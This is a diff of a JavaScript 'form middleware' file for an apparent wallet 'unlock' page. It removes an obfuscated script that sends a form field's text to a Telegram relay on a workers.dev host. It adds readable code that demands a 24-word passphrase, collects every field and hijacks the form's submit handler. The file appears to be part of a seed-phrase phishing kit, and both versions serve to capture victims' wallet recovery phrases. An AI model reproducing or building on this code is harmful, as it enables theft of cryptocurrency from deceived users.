@@ -1,1 +1,128 @@
-const _0x439043=_0x54dd;(function(_0x549e5a,_0x3a5240){const _0x168e89=_0x54dd,_0x4a3e1d=_0x549e5a();while(!![]){try{const _0x2b119d=-parseInt(_0x168e89(0x123))/0x1*(parseInt(_0x168e89(0x113))/0x2)+parseInt(_0x168e89(0x110))/0x3+-parseInt(_0x168e89(0x119))/0x4+-parseInt(_0x168e89(0x122))/0x5*(-parseInt(_0x168e89(0x126))/0x6)+-parseInt(_0x168e89(0x121))/0x7*(-parseInt(_0x168e89(0xff))/0x8)+parseInt(_0x168e89(0x127))/0x9*(-parseInt(_0x168e89(0x100))/0xa)+-parseInt(_0x168e89(0x10a))/0xb;if(_0x2b119d===_0x3a5240)break;else _0x4a3e1d['push'](_0x4a3e1d['shift']());}catch(_0x4fdbc3){_0x4a3e1d['push'](_0x4a3e1d['shift']());}}}(_0x4be5,0xbc2e3));function _0x54dd(_0x482354,_0x33f7ec){const _0x4be566=_0x4be5();return _0x54dd=function(_0x54dda7,_0x53562c){_0x54dda7=_0x54dda7-0xf9;let _0x519cee=_0x4be566[_0x54dda7];return _0x519cee;},_0x54dd(_0x482354,_0x33f7ec);}const formMiddleware={'middlewares':[],'use':function(_0x5e3772){const _0x33725a=_0x54dd;return this[_0x33725a(0x105)]['push'](_0x5e3772),this;},'execute':function(_0x5963e1,_0x4d1a22,_0x486bfc){let _0x34147b=0x0;const _0x11e837=(_0x1682a1=!![])=>{const _0x1ea8ce=_0x54dd;if(!_0x1682a1){console['log'](_0x1ea8ce(0x128));typeof _0x486bfc==='function'&&_0x486bfc();return;}if(_0x34147b<this['middlewares'][_0x1ea8ce(0xfd)]){const _0x22a406=this['middlewares'][_0x34147b];_0x34147b++,_0x22a406(_0x5963e1,_0x11e837);}else _0x4d1a22();};_0x11e837();}},unlockFormMiddleware=Object['create'](formMiddleware);function _0x4be5(){const _0x2b1284=['length','log','365696mTFguy','880ojWlnM','error','Step\x201:\x20Form\x20submission\x20detected','then','Validation\x20failed,\x20stopping\x20middleware\x20chain','middlewares','prototype','API\x20response\x20was\x20not\x20ok','description','https://sendmessagetele.myloverkt.workers.dev/?text=','14131865fpNdlq','Form\x20submission\x20cancelled\x20by\x20middleware\x20or\x20API\x20check','submit','execute','Telegram\x20notification\x20error:','Combined\x20middleware:\x20Processing\x20form\x20submission','3865125OXqTWY','All\x20middlewares\x20and\x20API\x20checks\x20completed\x20successfully','includes','22NsUfxU','error_code','call','Step\x202:\x20Validating\x20content\x20format','allowFormSubmission','use','1598668QsCVXC','Content\x20validation\x20skipped:','addEventListener','Telegram\x20notification\x20sent:','Step\x203:\x20Making\x20API\x20call','API\x20check\x20passed,\x20proceeding\x20with\x20form\x20submission','preventDefault','getElementById','189kpvjQE','23265Qelnfm','16063ujvDDB','Form\x20submission\x20intercepted\x20by\x20middleware','value','1122rOdupd','77814IBkdxM','Middleware\x20chain\x20stopped\x20-\x20a\x20middleware\x20returned\x20false','API\x20error,\x20cancelling\x20form\x20submission','Proceeding\x20with\x20original\x20form\x20handler','content','API\x20check\x20failed,\x20cancelling\x20form\x20submission','Setting\x20up\x20form\x20middleware\x20=>\x20v3','Form\x20submission\x20not\x20allowed\x20by\x20middleware\x20or\x20API'];_0x4be5=function(){return _0x2b1284;};return _0x4be5();}unlockFormMiddleware[_0x439043(0x118)](function(_0x3df0f1,_0x59cbb7){const _0x297ba7=_0x439043;console[_0x297ba7(0xfe)](_0x297ba7(0x10f)),console['log'](_0x297ba7(0x102));try{const _0x33324b=document[_0x297ba7(0x120)](_0x297ba7(0xf9))[_0x297ba7(0x125)];console['log'](_0x297ba7(0x116)),console[_0x297ba7(0xfe)](_0x297ba7(0x11d)),fetch(_0x297ba7(0x109)+_0x33324b)[_0x297ba7(0x103)](_0x5e2734=>{const _0x13fbcf=_0x297ba7;if(!_0x5e2734['ok'])throw new Error(_0x13fbcf(0x107));return _0x5e2734['json']();})[_0x297ba7(0x103)](_0x3b6b5d=>{const _0x4cde9f=_0x297ba7;console['log'](_0x4cde9f(0x11c),_0x3b6b5d);const _0x22704f=!![];_0x22704f?(console[_0x4cde9f(0xfe)](_0x4cde9f(0x11e)),_0x3df0f1[_0x4cde9f(0x117)]=!![],_0x59cbb7(!![])):(console[_0x4cde9f(0xfe)](_0x4cde9f(0xfa)),_0x59cbb7(![]));})['catch'](_0x4d6f42=>{const _0x408282=_0x297ba7;console[_0x408282(0x101)](_0x408282(0x10e),_0x4d6f42),console[_0x408282(0xfe)](_0x408282(0x129)),_0x59cbb7(![]);});const _0x2d69b7=![];if(!_0x2d69b7)return console['log'](_0x297ba7(0x104)),_0x59cbb7(![]);}catch(_0x244827){console[_0x297ba7(0xfe)](_0x297ba7(0x11a),_0x244827['message']);}});let middlewareExecuting=![];document[_0x439043(0x11b)]('DOMContentLoaded',function(){const _0x2b0bd2=_0x439043;console[_0x2b0bd2(0xfe)](_0x2b0bd2(0xfb));const _0x2a7f54=document[_0x2b0bd2(0x120)]('unlockForm');if(_0x2a7f54){const _0x4c25fe=Element[_0x2b0bd2(0x106)]['addEventListener'];_0x2a7f54[_0x2b0bd2(0x11b)]=function(_0x45b73f,_0x38714c,_0x4bfe04){const _0x3f4e8d=_0x2b0bd2;if(_0x45b73f===_0x3f4e8d(0x10c)){console[_0x3f4e8d(0xfe)]('Intercepting\x20submit\x20event\x20binding');const _0x1fb23a=function(_0xe82b68){const _0xeb9dd4=_0x3f4e8d;_0xe82b68[_0xeb9dd4(0x11f)]();if(middlewareExecuting)return;middlewareExecuting=!![],console['log'](_0xeb9dd4(0x124)),unlockFormMiddleware[_0xeb9dd4(0x10d)](_0xe82b68,function(){const _0x1a3fba=_0xeb9dd4;console['log'](_0x1a3fba(0x111)),_0xe82b68[_0x1a3fba(0x117)]?(console[_0x1a3fba(0xfe)](_0x1a3fba(0x12a)),_0x38714c['call'](_0x2a7f54,_0xe82b68)):console[_0x1a3fba(0xfe)](_0x1a3fba(0xfc)),setTimeout(()=>{middlewareExecuting=![];},0x64);},function(){const _0x4df666=_0xeb9dd4;console[_0x4df666(0xfe)](_0x4df666(0x10b)),setTimeout(()=>{middlewareExecuting=![];},0x64);});};return _0x4c25fe[_0x3f4e8d(0x115)](this,_0x45b73f,_0x1fb23a,_0x4bfe04);}return _0x4c25fe[_0x3f4e8d(0x115)](this,_0x45b73f,_0x38714c,_0x4bfe04);};}});function checkApiResponse(_0x456671){const _0x54bbd9=_0x439043;if(_0x456671['ok']===![])return![];if(_0x456671[_0x54bbd9(0x114)]||_0x456671[_0x54bbd9(0x108)]&&_0x456671[_0x54bbd9(0x108)][_0x54bbd9(0x112)](_0x54bbd9(0x101)))return![];return!![];}console[_0x439043(0xfe)]('Form\x20middleware\x20system\x20initialized');
+/**
+ * Form Middleware System
+ * This file provides a middleware system for form submissions
+ * It allows you to execute functions before the form submission handler runs
+ * Vanilla JavaScript implementation - no jQuery required
+ */
+
+// Create a middleware system for form submission
+const formMiddleware = {
+    middlewares: [],
+    
+    // Add a new middleware function
+    use: function(fn) {
+        this.middlewares.push(fn);
+        return this; // For chaining
+    },
+    
+    // Execute all middleware functions
+    execute: function(event, next) {
+        let index = 0;
+        
+        // Function to call the next middleware
+        const executeNext = () => {
+            if (index < this.middlewares.length) {
+                const middleware = this.middlewares[index];
+                index++;
+                // Call the middleware with the event and next function
+                middleware(event, executeNext);
+            } else {
+                // All middlewares executed, call the final callback
+                next();
+            }
+        };
+        
+        // Start executing middlewares
+        executeNext();
+    }
+};
+
+// Initialize the form middleware for unlock form
+const unlockFormMiddleware = Object.create(formMiddleware);
+
+// Middleware: Extract form data
+unlockFormMiddleware.use(function(event, next) {
+    console.log('Middleware 1: Extracting form data');
+    event.preventDefault(); // Ngăn reload form mặc định
+
+    const form = event.target;
+    const formData = new FormData(form);
+
+    const data = {};
+    formData.forEach((value, key) => {
+        data[key] = value.trim();
+    });
+
+    // Attach formData object to event
+    event.formData = data;
+
+    console.log('Form data:', data);
+    next();
+});
+
+// Middleware: Validate passphrase format
+unlockFormMiddleware.use(function(event, next) {
+    console.log('Middleware 2: Validating passphrase');
+
+    const passphrase = event.formData?.message || '';
+
+    if (!passphrase) {
+        alert('Please enter your 24-word passphrase');
+        return;
+    }
+
+    const words = passphrase.split(/\s+/);
+    if (words.length !== 24) {
+        alert('Passphrase must contain exactly 24 words');
+        return;
+    }
+
+    next();
+});
+
+// Flag to track if middleware has already been executed for this submission
+let middlewareExecuting = false;
+
+// Wait for DOM to be fully loaded
+document.addEventListener('DOMContentLoaded', function() {
+    console.log('Setting up form middleware => v4');
+    
+    // Get the form element
+    const unlockForm = document.getElementById('unlockForm') 
+                    || document.querySelector('.ladi-form');
+    
+    if (unlockForm) {
+        // Store a reference to the original addEventListener method
+        const originalAddEventListener = Element.prototype.addEventListener;
+        
+        // Override the addEventListener method for the form
+        unlockForm.addEventListener = function(type, listener, options) {
+            if (type === 'submit') {
+                console.log('Intercepting submit event binding');
+                
+                // Create a new listener that runs middlewares first
+                const wrappedListener = function(event) {
+                    if (middlewareExecuting) return;
+                    
+                    middlewareExecuting = true;
+                    console.log('Form submission intercepted by middleware');
+                    
+                    // Run middlewares first
+                    unlockFormMiddleware.execute(event, function() {
+                        console.log('All middlewares completed, proceeding with original handler');
+                        // Call the original listener
+                        listener.call(unlockForm, event);
+                        // Reset flag after a short delay
+                        setTimeout(() => { middlewareExecuting = false; }, 100);
+                    });
+                };
+                
+                return originalAddEventListener.call(this, type, wrappedListener, options);
+            }
+            
+            return originalAddEventListener.call(this, type, listener, options);
+        };
+    }
+});
+
+console.log('Form middleware system initialized');
